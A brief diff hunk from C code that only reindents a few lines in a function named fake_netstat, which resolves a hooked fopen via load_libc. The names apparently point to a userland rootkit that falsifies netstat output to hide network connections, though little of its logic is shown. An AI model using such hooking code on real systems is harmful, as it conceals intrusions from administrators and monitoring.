@@ -65,9 +65,9 @@ int is_net_file(const char *pathname){
  *  returns: 1 if works otherwise 0  
  */
 int fake_netstat(char *pathname, char *newfile){
-	if(!hooked_fopen){
-		hooked_fopen = load_libc("fopen");
-	}
+    if(!hooked_fopen){
+        hooked_fopen = load_libc("fopen");
+    }
     FILE *real_fp = hooked_fopen(pathname, "r");
     if (!real_fp){
         return 0;
